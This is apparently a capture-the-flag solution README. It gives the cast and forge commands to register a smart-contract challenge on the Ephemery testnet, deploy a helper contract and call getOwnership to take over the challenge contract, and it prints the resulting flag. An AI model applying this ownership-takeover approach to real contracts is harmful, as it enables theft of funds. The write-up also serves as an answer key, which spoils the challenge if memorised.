# ephemeral POC

0. Get 32 ETH from ephemery testnet faucet
1. Register challenge using cast
```
cast send --chain 39438141 --private-key 0x... --rpc-url http://... SETUP_ADDR "register()"
```
2. Get the challenge address
```
cast call --chain 39438141 --from PLAYER_ADDR  --rpc-url http://... SETUP_ADDR "getChallenge()"
```
3. `forge init`
4. Put `Helper.sol` at `src/`
5. `forge build`
6. Inspect and copy the bytecode of `Helper` contract by `cat out/Helper.sol/Helper.json` (use the `bytecode.object` value)
7. Deploy `Helper` contract and copy the newly deployed contract address
```
cast send --chain 39438141 --private-key 0x... --rpc-url http://... --create BYTECODE
```
8. send `getOwnership`
```
cast send --chain 39438141 --private-key 0x... --rpc-url http://... CHAL_ADDR "getOwnership(address)" HELPER_ADDR
```
9. Use verifiyer to get flag
```
ARA6{sh0u7_out_70_3ph3me24l_prov1d3r5}
```
